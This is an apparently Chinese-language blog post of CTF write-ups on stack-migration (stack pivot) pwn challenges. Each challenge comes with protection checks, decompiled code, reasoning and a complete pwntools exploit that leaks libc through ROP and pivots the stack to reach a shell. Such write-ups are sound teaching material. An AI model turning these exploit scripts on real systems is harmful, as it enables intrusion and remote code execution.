

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content>
  <meta name="author" content="chumen77">
  <meta name="keywords" content>
  <title>Stack Migration题目练习 - Chumen77&#39;s Blog</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    
      
      <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/apache-config.min.css">
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->
<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">

<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">

<link rel="stylesheet" href="/css/main.css">

<!-- 自定义样式保持在最底部 -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-02-11 21:51" pubdate>
        2020年2月11日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.1k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      32
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">Stack Migration题目练习</h1>
            
            <div class="markdown-body" id="post-body">
              <h1 id="Stack-Migration题目练习"><a href="#Stack-Migration题目练习" class="headerlink" title="Stack Migration题目练习"></a>Stack Migration题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录几道Stack Migration的练习题。</p>
<h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><h3 id="查看保护和arch"><a href="#查看保护和arch" class="headerlink" title="查看保护和arch"></a>查看保护和arch</h3><div class="hljs"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      <span class="hljs-function">No <span class="hljs-title">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span></span></code></pre></div>

<p>32位程序，开了nx和Canary保护。</p>
<h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span>
</span>&#123;
  <span class="hljs-keyword">int</span> de_s; <span class="hljs-comment">// [esp+18h] [ebp-28h]</span>
  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+1Eh] [ebp-22h]</span>
  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> de_length; <span class="hljs-comment">// [esp+3Ch] [ebp-4h]</span>

  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x1E</span>u);
  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);
  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Authenticate : "</span>);
  _isoc99_scanf(<span class="hljs-string">"%30s"</span>, &amp;s);
  <span class="hljs-built_in">memset</span>(&amp;input, <span class="hljs-number">0</span>, <span class="hljs-number">0xC</span>u);
  de_s = <span class="hljs-number">0</span>;
  de_length = Base64Decode((<span class="hljs-keyword">int</span>)&amp;s, &amp;de_s);     <span class="hljs-comment">// v6 = 解码后的长度</span>
  <span class="hljs-keyword">if</span> ( de_length &gt; <span class="hljs-number">0xC</span> )
  &#123;
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wrong Length"</span>);
  &#125;
  <span class="hljs-keyword">else</span>
  &#123;
    <span class="hljs-built_in">memcpy</span>(&amp;input, de_s, de_length);  <span class="hljs-comment">// 执行完，把解码后的字段，放入input的bss内存上</span>
    <span class="hljs-keyword">if</span> ( auth(de_length) == <span class="hljs-number">1</span> )
      correct();
  &#125;
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<p>（其中已经改了部分变量的名称方便读代码）<br>流程就是接受一段base64编码过的字符串，然后进行一下解码，解码返回长度给变量，且做与12大小的比较，如果解码后大于12，就直接退出程序，并且解码的字符串是放在input的这个全局变量里：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814303737109.jpg" srcset="/img/loading.gif" alt="-w601"><br>接着进入auth函数分析一下：</p>
<div class="hljs"><pre><code class="hljs c">_BOOL4 __<span class="hljs-function">cdecl <span class="hljs-title">auth</span><span class="hljs-params">(<span class="hljs-keyword">int</span> length)</span>
</span>&#123;
  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// [esp+14h] [ebp-14h]</span>
  <span class="hljs-keyword">char</span> *s2; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span>
  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+20h] [ebp-8h]</span>

  <span class="hljs-built_in">memcpy</span>(&amp;v4, &amp;input, length);
  s2 = (<span class="hljs-keyword">char</span> *)calc_md5((<span class="hljs-keyword">int</span>)&amp;v2, <span class="hljs-number">12</span>);
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hash : %s\n"</span>, s2);
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">"f87cd601aa7fedca99018a8be88eda34"</span>, s2) == <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<p>可以发现其是一个md5加密后，然后跟后面那串字符串对比。并且看一下v4变量：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814310284289.jpg" srcset="/img/loading.gif" alt="-w407"><br>发现memcpy这个函数会引起栈溢出，但是可控的只是12-8 = 4字节。<img src="/2020/02/11/Stack Migration题目练习/images/15814313605840.jpg" srcset="/img/loading.gif" alt="-w1241"><br>然后输入12位‘1’，编码后放入程序，发现最后的4个字节被放入了ebp，正好这下就可以控制ebp了。接着就有了攻击思路：</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>控制好这个ebp，然后由于这个程序中，auth函数最后有一个leave ret 的gadget，main函数也有一个，正好满足我们来Stack Migration。在栈上摆放的结构为：<br><img src="/2020/02/11/Stack Migration题目练习/images/15814316930734.jpg" srcset="/img/loading.gif" alt="-w353"><br>到时候由于memcpy会复制这个老栈的前12个字节的数据，然后new esp指向的是固定位置input。然后两个leave gadget即可</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *
# <span class="hljs-built_in">io</span> = process(<span class="hljs-string">'./login'</span>)
<span class="hljs-built_in">io</span> = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29026</span>)
system_add = <span class="hljs-number">0x08049284</span>
buf = <span class="hljs-number">0x0811EB40</span>
<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'e : '</span>)
p = <span class="hljs-string">'aaaa'</span> + p32(system_add) + p32(buf)
<span class="hljs-built_in">io</span>.sendline(b64encode(p))
<span class="hljs-built_in">io</span>.interactive()</code></pre></div>

<h2 id="安恒月赛-over-over"><a href="#安恒月赛-over-over" class="headerlink" title="安恒月赛_over.over"></a>安恒月赛_over.over</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/media/psf/mypwn2/ichunqiu/stack_pivot/ah_over/over.over'</span>
<span class="hljs-attr">    Arch:</span>     <span class="hljs-string">amd64-64-little</span>
<span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span>
<span class="hljs-attr">    Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span>
<span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span>
<span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div>

<p>64位，只开了nx</p>
<h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs undefined">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
&#123;
  setvbuf(stdin, <span class="hljs-number">0</span>LL, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>LL);
  setvbuf(stdout, <span class="hljs-number">0</span>LL, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>LL);
  <span class="hljs-keyword">while</span> ( sub_400676() )
    ;
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>LL;
&#125;</code></pre></div>

<p>主函数十分简单，主要核心就在while包裹的函数:</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_400676</span><span class="hljs-params">()</span>
</span>&#123;
  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span>

  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>uLL);
  <span class="hljs-built_in">putchar</span>(<span class="hljs-string">'&gt;'</span>);
  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x60</span>uLL);
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(&amp;buf);
&#125;</code></pre></div>

<p>可以看到溢出可控自己只有8个字节，也就是一个gadget，明显需要Stack Migration，<br>那么就得控制好ebp，padding即为0x50，但是这个题目没有给我们固定的地址，也就是没有全局变量可用，那就想办法看栈偏移了。</p>
<p>可以看到是read函数，和puts函数的搭配，当往里面塞0x50字节字符是不会添加上’\x00’的:<br><img src="/2020/02/11/Stack Migration题目练习/images/15814741030442.jpg" srcset="/img/loading.gif" alt="-w781"><br><img src="/2020/02/11/Stack Migration题目练习/images/15814741289950.jpg" srcset="/img/loading.gif" alt="-w649"></p>
<p>然后用puts函数输出时会把ebp里面的值也会输出出来。这下栈偏移是固定的，就可以在read的时候往里面塞rop链，依靠偏移来跳上去执行就可以了。<br><img src="/2020/02/11/Stack Migration题目练习/images/15814770925207.jpg" srcset="/img/loading.gif" alt="-w842"><br>算一下main的ebp与现在的esp差距是112个字节。让ebp-112就等于esp指向了栈顶esp。</p>
<h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>先给程序0x50个字节，然后接收下main的ebp值。然后程序由于while循环再次，进入这个函数，这时候送rop链，第一个rop链可以先泄露下puts的内存地址，然后计算libc的地址，返回地址写成主函数start，清理下栈。然后第二次读的时候，送过去system(/bin/sh)的rop链即可。程序每次读，构造好rop链的时候，要保证送过去80字节，然后控制ebp 为栈顶esp，还有加上leave 的gadget，这下两个leave的gadget就让程序跳回栈头的下个8个字节，开始执行rop链。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level = <span class="hljs-string">'debug'</span>
context.arch = <span class="hljs-string">'amd64'</span>
io = process(<span class="hljs-string">'./over.over'</span>)
e = ELF(<span class="hljs-string">'./over.over'</span>)
l = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)
leave_ret = <span class="hljs-number">0x004006be</span> 
pop_rdi_ret = <span class="hljs-number">0x0400793</span>
put_got = e.got[<span class="hljs-string">'puts'</span>]
put_plt = e.symbols[<span class="hljs-string">'puts'</span>]
padding = <span class="hljs-number">80</span>
raw_input(<span class="hljs-string">'-&gt;'</span>)
io.sendafter(<span class="hljs-string">"&gt;"</span>, <span class="hljs-string">'a'</span> * <span class="hljs-number">80</span>)
<span class="hljs-comment"># stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70</span>
stack = u64((io.recvline())[<span class="hljs-number">80</span>:<span class="hljs-number">86</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x70</span>
io.readuntil(<span class="hljs-string">'&gt;'</span>)
print(hex(stack))
p = flat([<span class="hljs-string">'11111111'</span>,pop_rdi_ret,put_got,put_plt,<span class="hljs-number">0x000400580</span>,(<span class="hljs-number">80</span><span class="hljs-number">-40</span>)*<span class="hljs-string">'1'</span>,stack,leave_ret])
raw_input(<span class="hljs-string">'-&gt;'</span>)
io.send(p)
libc = u64(io.recvuntil(<span class="hljs-string">"\x7f"</span>)[<span class="hljs-number">-6</span>: ].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>)) - l.symbols[<span class="hljs-string">'puts'</span>]
print(hex(libc))
io.sendafter(<span class="hljs-string">"&gt;"</span>, <span class="hljs-string">'a'</span> * <span class="hljs-number">80</span>)
stack = u64((io.recvline())[<span class="hljs-number">80</span>:<span class="hljs-number">86</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x70</span>
print(hex(stack))
io.readuntil(<span class="hljs-string">'&gt;'</span>)
system_add = libc + l.symbols[<span class="hljs-string">'system'</span>]
binsh_add = libc + l.search(<span class="hljs-string">'/bin/sh\x00'</span>).next()
p = flat([<span class="hljs-string">'22222222'</span>,pop_rdi_ret,binsh_add,system_add,(<span class="hljs-number">80</span><span class="hljs-number">-4</span>*<span class="hljs-number">8</span>)*<span class="hljs-string">'2'</span>,stack,leave_ret])
io.send(p)
io.interactive()</code></pre></div>

<h2 id="HITCON-training-lab6"><a href="#HITCON-training-lab6" class="headerlink" title="HITCON_training_lab6"></a>HITCON_training_lab6</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-keyword">int</span> count = <span class="hljs-number">1337</span> ;
<span class="hljs-keyword">char</span> *t= <span class="hljs-string">"Z\xc3"</span> ;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;
<span class="hljs-keyword">if</span>( count!=<span class="hljs-number">1337</span> )&#123;
    _exit(<span class="hljs-number">1</span>);
&#125;
count++ ;
<span class="hljs-keyword">char</span> buf[<span class="hljs-number">48</span>];
setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);
<span class="hljs-built_in">puts</span>(<span class="hljs-string">"Try your best : "</span> );
read(<span class="hljs-number">0</span>, buf,<span class="hljs-number">128</span>);
<span class="hljs-keyword">return</span> ;
&#125;</code></pre></div>

<p><code>gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> 编译命令。<br>然后就不分析了，前面练习64位时候写的那个博客已经记录很清楚了，这里只记录下exp。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *
context.arch = 'i386'
context.log_level = 'debug'
<span class="hljs-comment"># io = process('./migration')</span>
io = remote('127.0.0.1',4000)
e = ELF('./migration')
l = ELF('/lib/i386-linux-gnu/libc-2.23.so')
padding = 40
puts_plt = e.symbols['puts']
puts_got = e.got['puts']
read = e.symbols['read']
leave_ret = 0x08048418
buf1 = 0x0804b000 - 0x100
buf2 = buf1 - 0x50
pop_edx_ret = 0x0804836d
p = 'a' * padding + flat([buf1,read,leave_ret,0,buf1,0x50])
<span class="hljs-section">io.readuntil(':\n')</span>
io.send(p)
p = flat([buf2,puts_plt,pop_edx_ret,puts_got,read,leave_ret,0,buf2,0x50])
sleep(0.1)
raw_input('-&gt;')
io.sendline(p)
puts_add = u32(io.recv(4))
libc = puts_add - l.symbols['puts']
print(hex(libc))
system_add = l.symbols['system'] + libc
binsh_add = l.search('/bin/sh\x00').next() + libc
p = flat([buf1,system_add,system_add,binsh_add])
raw_input('-&gt;')
<span class="hljs-comment"># sleep(0.1)</span>
io.sendline(p)
io.interactive()</code></pre></div>

<h2 id="spwn"><a href="#spwn" class="headerlink" title="spwn"></a>spwn</h2><h3 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span>
<span class="hljs-attr">  RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span>
<span class="hljs-attr">  Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span>
<span class="hljs-attr">  NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span>
<span class="hljs-attr">  PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div>

<h3 id="尝试运行"><a href="#尝试运行" class="headerlink" title="尝试运行"></a>尝试运行</h3><p><img src="/2020/02/11/Stack Migration题目练习/images/15817739064330.jpg" srcset="/img/loading.gif" alt="-w602"></p>
<h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p>直接看漏洞函数</p>
<div class="hljs"><pre><code class="hljs undefined">ssize_t vul_function()
&#123;
  size_t v0; <span class="hljs-comment">// eax</span>
  size_t v1; <span class="hljs-comment">// eax</span>
  char buf; <span class="hljs-comment">// [esp+0h] [ebp-18h]</span>
  v0 = strlen(m1);
  write(<span class="hljs-number">1</span>, m1, v0);                             <span class="hljs-comment">// Hello good Ctfer</span>
  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x200</span>u);
  v1 = strlen(m2);
  write(<span class="hljs-number">1</span>, m2, v1);                             <span class="hljs-comment">// What do you want to say?</span>
  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x20</span>u);
&#125;</code></pre></div>

<p>发现可以利用的gadget只有一个，那就只有leave的gadget了，然后把ebp控制到前面的read函数的s处，其也是全局变量，地址固定。<br><img src="/2020/02/11/Stack Migration题目练习/images/15817774030678.jpg" srcset="/img/loading.gif" alt="-w358"></p>
<h4 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol>
<li>在第一个read的时候，直接把构造的rop链读进去。任务分别是leak 一个函数的内存地址，来用libcseacher算出system，跟/bin/sh字符串的地址，返回start函数清理栈开启第二次使用漏洞； call system（/bin/sh）</li>
<li>然后第二个read时候，把控ebp指向固定地址s的地址，retaddress 放上leave的gadget。</li>
</ol>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *
context.arch = <span class="hljs-string">'i386'</span>
context.log_level = <span class="hljs-string">'debug'</span>
from LibcSearcher import *
e = ELF(<span class="hljs-string">'./spwn'</span>)
<span class="hljs-built_in">io</span> = process(<span class="hljs-string">'./spwn'</span>)
# libc = e.libc
<span class="hljs-built_in">io</span> = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28527</span>)
padding = <span class="hljs-number">24</span>
s = <span class="hljs-number">0x0804A300</span>
fake1 = <span class="hljs-number">0x0804A500</span>
leave_ret = <span class="hljs-number">0x08048511</span>
puts_add = e.symbols[<span class="hljs-string">'puts'</span>]
write_plt = e.symbols[<span class="hljs-string">'write'</span>]
write_got = e.got[<span class="hljs-string">'write'</span>]
<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'name?'</span>)
p = flat([fake1,write_plt,<span class="hljs-number">0x080483A0</span>,<span class="hljs-number">1</span>,write_got,<span class="hljs-number">10</span>])
<span class="hljs-built_in">io</span>.send(p)
<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'say?'</span>)
p = padding * <span class="hljs-string">'a'</span> + p32(s) + p32(leave_ret)
# raw_input(<span class="hljs-string">'-&gt;'</span>)
<span class="hljs-built_in">io</span>.send(p)
write_add = u32(<span class="hljs-built_in">io</span>.recv(<span class="hljs-number">4</span>))
<span class="hljs-built_in">print</span>(hex(write_add))
obj = LibcSearcher(<span class="hljs-string">'write'</span>,write_add)
libc_base = write_add - obj.<span class="hljs-built_in">dump</span>(<span class="hljs-string">'write'</span>) #libc.symbols[<span class="hljs-string">'write'</span>]
<span class="hljs-built_in">print</span>(hex(obj.<span class="hljs-built_in">dump</span>(<span class="hljs-string">'write'</span>)))
<span class="hljs-built_in">print</span>(hex(libc_base))
sys_add = libc_base + obj.<span class="hljs-built_in">dump</span>(<span class="hljs-string">'system'</span>) #libc.symbols[<span class="hljs-string">'system'</span>]
binsh_add =libc_base + obj.<span class="hljs-built_in">dump</span>(<span class="hljs-string">'str_bin_sh'</span>) #libc.search(<span class="hljs-string">'/bin/sh\x00'</span>).<span class="hljs-built_in">next</span>()
<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'name?'</span>)
p = flat([fake1,sys_add,<span class="hljs-number">0x080483A0</span>,binsh_add])
<span class="hljs-built_in">io</span>.send(p)
<span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'say?'</span>)
p = padding * <span class="hljs-string">'a'</span> + p32(s) + p32(leave_ret)
<span class="hljs-built_in">io</span>.send(p)
<span class="hljs-built_in">io</span>.interactive()</code></pre></div>

<h2 id="ACTF-2019-hardcore-fmt"><a href="#ACTF-2019-hardcore-fmt" class="headerlink" title="ACTF_ 2019_hardcore fmt"></a>ACTF_ 2019_hardcore fmt</h2><h3 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/media/psf/mypwn2/buuctf/actf_2019_babystack/ACTF_2019_babystack'</span>
<span class="hljs-attr">    Arch:</span>     <span class="hljs-string">amd64-64-little</span>
<span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span>
<span class="hljs-attr">    Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span>
<span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span>
<span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div>

<h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>￼￼￼￼<br><img src="http://q5j29gptn.bkt.clouddn.com/uPic/oj5gX3.png" srcset="/img/loading.gif" alt><br>其中可以看到后面的read处，存在一个栈溢出，但是只有一个gadget可以用，需要考虑Stack Migration。其中那个<strong>sub400a1a</strong>函数是问你需要留下多少的字节，肯定要<code>0xe0</code>，所以再送过去的时候就填入0xe0，正好做参数给下面read函数用。</p>
<p>然后程序接受到0xe0后，进入if语句中，会输出一下堆栈esp的值，这下也是相当于知道了一个特定的地址，然后就正常构造rop链，把控ebp等于为接收到的stack esp，再跟上leava gadget即可。</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *
context.log_level = <span class="hljs-string">'debug'</span>
context.arch = <span class="hljs-string">'amd64'</span>
<span class="hljs-comment"># io = process('./ACTF_2019_babystack')</span>
<span class="hljs-comment"># io = remote('node3.buuoj.cn',27626)</span>
io = remote(<span class="hljs-string">'challenge-848a378609341016.sandbox.ctfhub.com'</span>, <span class="hljs-number">24656</span>)
elf = ELF(<span class="hljs-string">'./ACTF_2019_babystack'</span>)
<span class="hljs-comment"># libc = elf.libc</span>
io.recvuntil(<span class="hljs-string">'message?\n'</span>)
io.sendline(<span class="hljs-string">'224'</span>)
io.recvuntil(<span class="hljs-string">'saved at'</span>)
stack_addr =  int((io.recvline_contains(<span class="hljs-string">'0x7f'</span>)),<span class="hljs-number">16</span>)
print(stack_addr)
libc_start_main_got = elf.got[<span class="hljs-string">'__libc_start_main'</span>]
puts_plt = elf.symbols[<span class="hljs-string">'puts'</span>]
pop_rdi_ret = <span class="hljs-number">0x000400ad3</span>
start_addr = <span class="hljs-number">0x000400800</span>
leave_ret = <span class="hljs-number">0x400a18</span> 
payload = flat([<span class="hljs-string">'\x00'</span>*<span class="hljs-number">8</span>,pop_rdi_ret,libc_start_main_got,puts_plt,start_addr])
payload = payload.ljust(<span class="hljs-number">208</span>,<span class="hljs-string">'a'</span>)
payload += flat([stack_addr,leave_ret])
io.recvuntil(<span class="hljs-string">'&gt;'</span>)
raw_input(<span class="hljs-string">'-&gt;'</span>)
io.send(payload)
io.recvuntil(<span class="hljs-string">'bye~\n'</span>)
libc_start_main_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) <span class="hljs-comment">#- libc.symbols['__libc_start_main']</span>
obj = LibcSearcher(<span class="hljs-string">'__libc_start_main'</span>,libc_start_main_addr)
libc_base = libc_start_main_addr - obj.dump(<span class="hljs-string">'__libc_start_main'</span>)
print(hex(libc_base))
io.recvuntil(<span class="hljs-string">'message?\n'</span>)
io.sendline(<span class="hljs-string">'224'</span>)
io.recvuntil(<span class="hljs-string">'saved at'</span>)
stack_addr =  int((io.recvline_contains(<span class="hljs-string">'0x7f'</span>)),<span class="hljs-number">16</span>)
print(stack_addr)
rec = libc_base + <span class="hljs-number">0x4f2c5</span>
payload = flat([<span class="hljs-string">'\x00'</span>*<span class="hljs-number">8</span>,rec])
payload = payload.ljust(<span class="hljs-number">208</span>,<span class="hljs-string">'\x00'</span>)
payload += flat([stack_addr,leave_ret])
io.recvuntil(<span class="hljs-string">'&gt;'</span>)
raw_input(<span class="hljs-string">'-&gt;'</span>)
io.send(payload)
io.interactive()</code></pre></div>


            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
